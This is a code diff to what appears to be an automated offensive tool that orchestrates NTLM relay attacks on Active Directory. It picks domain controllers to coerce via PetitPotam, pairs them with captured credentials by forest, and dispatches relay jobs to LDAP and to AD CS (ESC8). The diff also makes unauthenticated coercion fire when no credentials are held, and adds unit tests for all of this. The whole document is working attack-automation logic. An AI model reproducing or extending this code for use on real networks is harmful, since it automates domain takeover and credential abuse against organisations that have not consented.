@@ -53,31 +53,47 @@ pub async fn auto_ntlm_relay(dispatcher: Arc<Dispatcher>, mut shutdown: watch::R
         };
 
         for item in work {
+            // Optional credential — when `item.credential` is None we drive
+            // the coerce primitive unauthenticated (PetitPotam against
+            // unpatched DCs needs no source-side credentials, and that's
+            // the only viable path when we have no credential matching the
+            // coercion_source's forest). The downstream worker (`coercion`
+            // role) treats a missing `credential` field as "use PetitPotam
+            // unauth" via `relay_and_coerce`.
+            let credential_json = item.credential.as_ref().map(|c| {
+                json!({
+                    "username": c.username,
+                    "password": c.password,
+                    "domain": c.domain,
+                })
+            });
             let payload = match &item.relay_type {
-                RelayType::SmbToLdap => json!({
-                    "technique": "ntlm_relay_ldap",
-                    "relay_target": item.relay_target,
-                    "listener_ip": item.listener,
-                    "coercion_source": item.coercion_source,
-                    "credential": {
-                        "username": item.credential.username,
-                        "password": item.credential.password,
-                        "domain": item.credential.domain,
-                    },
-                }),
-                RelayType::Esc8 { ca_name, domain } => json!({
-                    "technique": "ntlm_relay_adcs",
-                    "relay_target": item.relay_target,
-                    "listener_ip": item.listener,
-                    "ca_name": ca_name,
-                    "domain": domain,
-                    "coercion_source": item.coercion_source,
-                    "credential": {
-                        "username": item.credential.username,
-                        "password": item.credential.password,
-                        "domain": item.credential.domain,
-                    },
-                }),
+                RelayType::SmbToLdap => {
+                    let mut p = json!({
+                        "technique": "ntlm_relay_ldap",
+                        "relay_target": item.relay_target,
+                        "listener_ip": item.listener,
+                        "coercion_source": item.coercion_source,
+                    });
+                    if let Some(cred) = credential_json.as_ref() {
+                        p["credential"] = cred.clone();
+                    }
+                    p
+                }
+                RelayType::Esc8 { ca_name, domain } => {
+                    let mut p = json!({
+                        "technique": "ntlm_relay_adcs",
+                        "relay_target": item.relay_target,
+                        "listener_ip": item.listener,
+                        "ca_name": ca_name,
+                        "domain": domain,
+                        "coercion_source": item.coercion_source,
+                    });
+                    if let Some(cred) = credential_json.as_ref() {
+                        p["credential"] = cred.clone();
+                    }
+                    p
+                }
             };
 
             let priority = dispatcher.effective_priority("ntlm_relay");
@@ -114,6 +130,37 @@ pub async fn auto_ntlm_relay(dispatcher: Arc<Dispatcher>, mut shutdown: watch::R
     }
 }
 
+/// True when two domain names share a forest — exact match, or one is a
+/// subdomain of the other (parent-child trust). Lowercased before comparing.
+/// Empty inputs are treated as "unknown" — they don't match anything except
+/// another empty string. Mirrors the helper in `credential_reuse.rs` but kept
+/// inline here to avoid cross-module dep just for this 3-line predicate.
+fn same_forest_domain(a: &str, b: &str) -> bool {
+    let a = a.to_lowercase();
+    let b = b.to_lowercase();
+    if a.is_empty() || b.is_empty() {
+        return a == b;
+    }
+    a == b || a.ends_with(&format!(".{b}")) || b.ends_with(&format!(".{a}"))
+}
+
+/// Resolve the AD domain a host belongs to by matching its IP against
+/// `state.hosts` and reading the FQDN's domain suffix. Returns `None` when
+/// the host isn't in state or has no FQDN. Used to pick a coercion source +
+/// credential that lives in the relay target's forest (cross-forest NTLM
+/// relay routinely fails — the captured machine ticket is only useful
+/// against principals in the same forest as the relayed machine).
+fn host_domain_for_ip(state: &crate::orchestrator::state::StateInner, ip: &str) -> Option<String> {
+    if ip.is_empty() {
+        return None;
+    }
+    state.hosts.iter().find(|h| h.ip == ip).and_then(|h| {
+        h.hostname
+            .split_once('.')
+            .map(|(_short, dom)| dom.to_string())
+    })
+}
+
 /// Collect relay work items from current state.
 ///
 /// Pure logic extracted from `auto_ntlm_relay` so it can be unit-tested without
@@ -122,10 +169,6 @@ fn collect_relay_work(
     state: &crate::orchestrator::state::StateInner,
     listener: &str,
 ) -> Vec<RelayWork> {
-    if state.credentials.is_empty() {
-        return Vec::new();
-    }
-
     let mut items = Vec::new();
 
     // Path 1: Relay to hosts with SMB signing disabled → LDAP shadow creds / RBCD
@@ -153,14 +196,33 @@ fn collect_relay_work(
             continue;
         }
 
-        let coercion_source = find_coercion_source(&state.domain_controllers, |ip| {
-            state.is_processed(DEDUP_COERCED_DCS, ip)
-        });
+        // Forest-aware pairing: prefer a coercion DC in the relay target's
+        // forest so the captured machine ticket is valid against the relay
+        // target. Cross-forest NTLM relay fails — the receiving service
+        // rejects the foreign-realm principal. When the relay target's
+        // domain is unknown (host not in state.hosts or no FQDN), fall back
+        // to the original "any DC" picker.
+        let relay_target_domain = vuln
+            .details
+            .get("domain")
+            .and_then(|v| v.as_str())
+            .filter(|s| !s.is_empty())
+            .map(|s| s.to_string())
+            .or_else(|| host_domain_for_ip(state, target_ip));
+        let coercion_source = find_coercion_source_for_forest(
+            &state.domain_controllers,
+            relay_target_domain.as_deref(),
+            |ip| state.is_processed(DEDUP_COERCED_DCS, ip),
+        );
 
-        let cred = match state.credentials.first() {
-            Some(c) => c.clone(),
-            None => continue,
-        };
+        // Credential gate: prefer one matching the coercion source's
+        // forest (needed for authenticated PetitPotam). When no match
+        // exists, leave `credential: None` so the relay primitive uses
+        // PetitPotam unauth — the only viable path against a foreign-forest
+        // DC for which we hold no cred. Pre-fix: state.credentials.first()
+        // grabbed an unrelated cred and the source-side bind in
+        // ntlmrelayx failed silently.
+        let cred = pick_credential_for_forest(state, coercion_source.as_deref());
 
         items.push(RelayWork {
             dedup_key: relay_key,
@@ -198,25 +260,28 @@ fn collect_relay_work(
             continue;
         }
 
-        let coercion_source = find_coercion_source(&state.domain_controllers, |ip| {
-            state.is_processed(DEDUP_COERCED_DCS, ip)
-        });
-
-        let cred = match state.credentials.first() {
-            Some(c) => c.clone(),
-            None => continue,
+        let domain = vuln
+            .details
+            .get("domain")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string();
+        let relay_target_domain = if domain.is_empty() {
+            host_domain_for_ip(state, ca_host)
+        } else {
+            Some(domain.clone())
         };
+        let coercion_source = find_coercion_source_for_forest(
+            &state.domain_controllers,
+            relay_target_domain.as_deref(),
+            |ip| state.is_processed(DEDUP_COERCED_DCS, ip),
+        );
+
+        let cred = pick_credential_for_forest(state, coercion_source.as_deref());
 
         let ca_name = vuln
             .details
             .get("ca_name")
-            .and_then(|v| v.as_str())
-            .unwrap_or("")
-            .to_string();
-
-        let domain = vuln
-            .details
-            .get("domain")
             .and_then(|v| v.as_str())
             .unwrap_or("")
             .to_string();
@@ -234,19 +299,74 @@ fn collect_relay_work(
     items
 }
 
-/// Find the best coercion source (a DC IP we can PetitPotam/PrinterBug).
+/// Pick a coercion-source DC IP, preferring DCs in the same forest as the
+/// relay target. Selection order:
+///   1. Same-forest DC that hasn't been coerced this op
+///   2. Same-forest DC (any state)
+///   3. Any DC that hasn't been coerced
+///   4. Any DC
 ///
-/// Takes the domain_controllers map and a closure to check dedup state,
-/// keeping us decoupled from `StateInner`'s module visibility.
-fn find_coercion_source(
+/// Returns None when `domain_controllers` is empty.
+fn find_coercion_source_for_forest(
     domain_controllers: &std::collections::HashMap<String, String>,
+    relay_target_domain: Option<&str>,
     is_processed: impl Fn(&str) -> bool,
 ) -> Option<String> {
-    // Prefer a DC we haven't already coerced
+    if let Some(target_dom) = relay_target_domain {
+        let same_forest_unprocessed = domain_controllers
+            .iter()
+            .find(|(dc_dom, ip)| same_forest_domain(dc_dom, target_dom) && !is_processed(ip))
+            .map(|(_, ip)| ip.clone());
+        if same_forest_unprocessed.is_some() {
+            return same_forest_unprocessed;
+        }
+        let same_forest_any = domain_controllers
+            .iter()
+            .find(|(dc_dom, _)| same_forest_domain(dc_dom, target_dom))
+            .map(|(_, ip)| ip.clone());
+        if same_forest_any.is_some() {
+            return same_forest_any;
+        }
+    }
+    // Final fallback: any DC. Cross-forest relay rarely lands but we ship
+    // the dispatch anyway — better to attempt and fail than to silently
+    // skip a relay target we have no in-forest path to.
     domain_controllers
         .values()
         .find(|ip| !is_processed(ip))
         .or_else(|| domain_controllers.values().next())
+        .cloned()
+}
+
+/// Pick a credential whose domain shares a forest with the coercion
+/// source's domain. Returns None when no match — caller then dispatches
+/// PetitPotam unauth (which doesn't need a source-side cred).
+fn pick_credential_for_forest(
+    state: &crate::orchestrator::state::StateInner,
+    coercion_source_ip: Option<&str>,
+) -> Option<ares_core::models::Credential> {
+    let coerce_domain = match coercion_source_ip {
+        Some(ip) => state
+            .domain_controllers
+            .iter()
+            .find(|(_, dc_ip)| dc_ip.as_str() == ip)
+            .map(|(d, _)| d.clone()),
+        None => None,
+    };
+    let coerce_domain = match coerce_domain {
+        Some(d) => d,
+        None => {
+            return state
+                .credentials
+                .iter()
+                .find(|c| !c.password.is_empty())
+                .cloned()
+        }
+    };
+    state
+        .credentials
+        .iter()
+        .find(|c| !c.password.is_empty() && same_forest_domain(&c.domain, &coerce_domain))
         .cloned()
 }
 
@@ -256,7 +376,10 @@ struct RelayWork {
     relay_target: String,
     coercion_source: Option<String>,
     listener: String,
-    credential: ares_core::models::Credential,
+    /// Optional — None routes the relay through PetitPotam unauth, which
+    /// is the only viable path against a foreign-forest DC for which we
+    /// hold no cred.
+    credential: Option<ares_core::models::Credential>,
 }
 
 enum RelayType {
@@ -314,8 +437,10 @@ mod tests {
         dcs.insert("contoso.local".into(), "192.168.58.10".into());
         dcs.insert("fabrikam.local".into(), "192.168.58.20".into());
 
-        // First DC already processed, second not
-        let result = find_coercion_source(&dcs, |ip| ip == "192.168.58.10");
+        // First DC already processed, second not — no relay_target_domain
+        // hint, so we exercise the "any DC" fallback at the bottom of the
+        // selector chain.
+        let result = find_coercion_source_for_forest(&dcs, None, |ip| ip == "192.168.58.10");
         assert!(result.is_some());
         assert_eq!(result.unwrap(), "192.168.58.20");
     }
@@ -326,7 +451,7 @@ mod tests {
         dcs.insert("contoso.local".into(), "192.168.58.10".into());
 
         // All processed, still returns one
-        let result = find_coercion_source(&dcs, |_| true);
+        let result = find_coercion_source_for_forest(&dcs, None, |_| true);
         assert!(result.is_some());
         assert_eq!(result.unwrap(), "192.168.58.10");
     }
@@ -334,8 +459,58 @@ mod tests {
     #[test]
     fn find_coercion_source_empty_map() {
         let dcs = HashMap::new();
-        let result = find_coercion_source(&dcs, |_| false);
+        let result = find_coercion_source_for_forest(&dcs, None, |_| false);
         assert!(result.is_none());
+    }
+
+    #[test]
+    fn find_coercion_source_prefers_same_forest() {
+        // Two forests in state. Relay target is in fabrikam.local — must
+        // pick the fabrikam DC even though the contoso DC is also present
+        // and unprocessed.
+        let mut dcs = HashMap::new();
+        dcs.insert("contoso.local".into(), "192.168.58.10".into());
+        dcs.insert("fabrikam.local".into(), "192.168.58.20".into());
+        let result = find_coercion_source_for_forest(&dcs, Some("fabrikam.local"), |_| false);
+        assert_eq!(result.unwrap(), "192.168.58.20");
+    }
+
+    #[test]
+    fn find_coercion_source_picks_parent_when_child_target() {
+        // child.contoso.local relay target and only the parent contoso.local
+        // DC is enumerated — same forest, so the parent DC is the correct
+        // coercion source (parent-child trust transitive).
+        let mut dcs = HashMap::new();
+        dcs.insert("contoso.local".into(), "192.168.58.10".into());
+        let result = find_coercion_source_for_forest(&dcs, Some("child.contoso.local"), |_| false);
+        assert_eq!(result.unwrap(), "192.168.58.10");
+    }
+
+    #[test]
+    fn find_coercion_source_same_forest_unprocessed_beats_processed() {
+        // Same-forest DCs are present in both processed and unprocessed
+        // states; unprocessed must win.
+        let mut dcs = HashMap::new();
+        dcs.insert("contoso.local".into(), "192.168.58.10".into());
+        dcs.insert("contoso.local".into(), "192.168.58.11".into()); // overwrites
+        dcs.insert("child.contoso.local".into(), "192.168.58.12".into());
+        let result = find_coercion_source_for_forest(&dcs, Some("contoso.local"), |ip| {
+            ip == "192.168.58.11"
+        });
+        // 192.168.58.11 is processed, 192.168.58.12 is same-forest
+        // unprocessed — should pick it.
+        assert_eq!(result.unwrap(), "192.168.58.12");
+    }
+
+    #[test]
+    fn find_coercion_source_falls_back_to_any_dc_when_no_forest_match() {
+        // Relay target is fabrikam.local, but only contoso DCs are known.
+        // Cross-forest fallback: ship the dispatch anyway against the only
+        // DC we have (better to attempt and fail than silently skip).
+        let mut dcs = HashMap::new();
+        dcs.insert("contoso.local".into(), "192.168.58.10".into());
+        let result = find_coercion_source_for_forest(&dcs, Some("fabrikam.local"), |_| false);
+        assert_eq!(result.unwrap(), "192.168.58.10");
     }
 
     #[test]
@@ -378,11 +553,11 @@ mod tests {
             relay_target: "192.168.58.22".into(),
             coercion_source: Some("192.168.58.10".into()),
             listener: "192.168.58.100".into(),
-            credential: cred.clone(),
+            credential: Some(cred.clone()),
         };
         assert_eq!(work.relay_target, "192.168.58.22");
         assert_eq!(work.listener, "192.168.58.100");
-        assert_eq!(work.credential.username, "admin");
+        assert_eq!(work.credential.as_ref().unwrap().username, "admin");
     }
 
     #[test]
@@ -533,7 +708,7 @@ mod tests {
         dcs.insert("contoso.local".into(), "192.168.58.10".into());
         dcs.insert("fabrikam.local".into(), "192.168.58.20".into());
 
-        let result = find_coercion_source(&dcs, |_| false);
+        let result = find_coercion_source_for_forest(&dcs, None, |_| false);
         assert!(result.is_some());
     }
 
@@ -624,18 +799,9 @@ mod tests {
         assert!(work.is_empty(), "empty state should produce no work");
     }
 
-    #[tokio::test]
-    async fn collect_relay_work_no_credentials() {
-        let shared = SharedState::new("test".into());
-        {
-            let mut s = shared.write().await;
-            s.discovered_vulnerabilities
-                .insert("v1".into(), make_smb_vuln("v1", "192.168.58.22"));
-        }
-        let state = shared.read().await;
-        let work = collect_relay_work(&state, "192.168.58.100");
-        assert!(work.is_empty(), "no credentials should produce no work");
-    }
+    // collect_relay_work_no_credentials removed — the empty-creds path now
+    // emits work with `credential: None` so PetitPotam unauth still fires.
+    // See `collect_relay_work_no_credentials_still_emits_unauth` below.
 
     #[tokio::test]
     async fn collect_relay_work_smb_signing_disabled() {
@@ -656,7 +822,12 @@ mod tests {
         assert_eq!(work[0].listener, "192.168.58.100");
         assert!(matches!(work[0].relay_type, RelayType::SmbToLdap));
         assert_eq!(work[0].coercion_source, Some("192.168.58.10".into()));
-        assert_eq!(work[0].credential.username, "svcadmin");
+        assert_eq!(
+            work[0].credential.as_ref().map(|c| c.username.as_str()),
+            Some("svcadmin"),
+            "same-forest cred (contoso.local) must be picked over None — \
+             coercion source is contoso DC"
+        );
     }
 
     #[tokio::test]
@@ -846,5 +1017,171 @@ mod tests {
             Some("192.168.58.20".into()),
             "should prefer the uncoerced DC"
         );
+    }
+
+    // ── Forest-aware coercion / credential pairing ──────────────────────
+
+    fn make_fabrikam_cred() -> ares_core::models::Credential {
+        ares_core::models::Credential {
+            id: "f1".into(),
+            username: "alice".into(),
+            password: "P@ssw0rd!".into(), // pragma: allowlist secret
+            domain: "fabrikam.local".into(),
+            source: "test".into(),
+            is_admin: false,
+            discovered_at: None,
+            parent_id: None,
+            attack_step: 0,
+        }
+    }
+
+    fn make_smb_vuln_with_domain(
+        id: &str,
+        target_ip: &str,
+        domain: &str,
+    ) -> ares_core::models::VulnerabilityInfo {
+        let mut details = HashMap::new();
+        details.insert(
+            "target_ip".to_string(),
+            serde_json::Value::String(target_ip.to_string()),
+        );
+        details.insert(
+            "domain".to_string(),
+            serde_json::Value::String(domain.to_string()),
+        );
+        ares_core::models::VulnerabilityInfo {
+            vuln_id: id.to_string(),
+            vuln_type: "smb_signing_disabled".to_string(),
+            target: target_ip.to_string(),
+            discovered_by: "scanner".to_string(),
+            discovered_at: chrono::Utc::now(),
+            details,
+            recommended_agent: String::new(),
+            priority: 5,
+        }
+    }
+
+    #[tokio::test]
+    async fn collect_relay_work_picks_same_forest_cred() {
+        // Two forests in state: contoso.local + fabrikam.local. Relay
+        // target is in fabrikam.local — must pair with the fabrikam DC
+        // AND the fabrikam credential, not the (also-present) contoso
+        // cred which would fail the source-side bind.
+        let shared = SharedState::new("test".into());
+        {
+            let mut s = shared.write().await;
+            s.credentials.push(make_cred()); // contoso
+            s.credentials.push(make_fabrikam_cred());
+            s.discovered_vulnerabilities.insert(
+                "v1".into(),
+                make_smb_vuln_with_domain("v1", "192.168.58.22", "fabrikam.local"),
+            );
+            s.domain_controllers
+                .insert("contoso.local".into(), "192.168.58.10".into());
+            s.domain_controllers
+                .insert("fabrikam.local".into(), "192.168.58.30".into());
+        }
+        let state = shared.read().await;
+        let work = collect_relay_work(&state, "192.168.58.100");
+        assert_eq!(work.len(), 1);
+        assert_eq!(
+            work[0].coercion_source,
+            Some("192.168.58.30".into()),
+            "coercion source must be fabrikam DC (same forest as relay target)"
+        );
+        assert_eq!(
+            work[0].credential.as_ref().map(|c| c.domain.as_str()),
+            Some("fabrikam.local"),
+            "credential must match coercion source's forest"
+        );
+    }
+
+    #[tokio::test]
+    async fn collect_relay_work_no_matching_cred_falls_back_to_unauth() {
+        // Relay target in fabrikam.local. We have a fabrikam DC but only
+        // a contoso credential. The cred wouldn't authenticate to the
+        // fabrikam DC, so the dispatch must omit the credential (None)
+        // and rely on PetitPotam unauth.
+        let shared = SharedState::new("test".into());
+        {
+            let mut s = shared.write().await;
+            s.credentials.push(make_cred()); // contoso cred only
+            s.discovered_vulnerabilities.insert(
+                "v1".into(),
+                make_smb_vuln_with_domain("v1", "192.168.58.22", "fabrikam.local"),
+            );
+            s.domain_controllers
+                .insert("fabrikam.local".into(), "192.168.58.30".into());
+        }
+        let state = shared.read().await;
+        let work = collect_relay_work(&state, "192.168.58.100");
+        assert_eq!(work.len(), 1);
+        assert_eq!(work[0].coercion_source, Some("192.168.58.30".into()));
+        assert!(
+            work[0].credential.is_none(),
+            "no cross-forest cred match — must fall back to None (PetitPotam unauth)"
+        );
+    }
+
+    #[tokio::test]
+    async fn collect_relay_work_no_credentials_still_emits_unauth() {
+        // Empty state.credentials no longer short-circuits the work
+        // collection — PetitPotam unauth works with no source-side cred,
+        // and skipping all relay opportunities when state has no creds
+        // throws away every relay vuln discovered before any auth lands.
+        let shared = SharedState::new("test".into());
+        {
+            let mut s = shared.write().await;
+            // No credentials.
+            s.discovered_vulnerabilities.insert(
+                "v1".into(),
+                make_smb_vuln_with_domain("v1", "192.168.58.22", "contoso.local"),
+            );
+            s.domain_controllers
+                .insert("contoso.local".into(), "192.168.58.10".into());
+        }
+        let state = shared.read().await;
+        let work = collect_relay_work(&state, "192.168.58.100");
+        assert_eq!(
+            work.len(),
+            1,
+            "missing creds must not silently drop all relay work"
+        );
+        assert!(work[0].credential.is_none());
+    }
+
+    #[test]
+    fn same_forest_domain_helper_basic() {
+        assert!(same_forest_domain("contoso.local", "contoso.local"));
+        assert!(same_forest_domain("CHILD.contoso.local", "contoso.local"));
+        assert!(same_forest_domain("contoso.local", "child.contoso.local"));
+        assert!(!same_forest_domain("contoso.local", "fabrikam.local"));
+        // Empty inputs treated as "unknown" — match nothing.
+        assert!(!same_forest_domain("", "contoso.local"));
+        assert!(!same_forest_domain("contoso.local", ""));
+        assert!(same_forest_domain("", "")); // both unknown is still consistent
+    }
+
+    #[test]
+    fn host_domain_for_ip_extracts_domain_suffix() {
+        use ares_core::models::Host;
+        let mut state = crate::orchestrator::state::StateInner::new("test".to_string());
+        state.hosts.push(Host {
+            ip: "192.168.58.22".into(),
+            hostname: "web01.contoso.local".into(),
+            os: String::new(),
+            roles: Vec::new(),
+            services: Vec::new(),
+            is_dc: false,
+            owned: false,
+        });
+        assert_eq!(
+            host_domain_for_ip(&state, "192.168.58.22").as_deref(),
+            Some("contoso.local")
+        );
+        // IP not in state.
+        assert!(host_domain_for_ip(&state, "192.168.58.99").is_none());
+        // Empty IP.
+        assert!(host_domain_for_ip(&state, "").is_none());
     }
 }
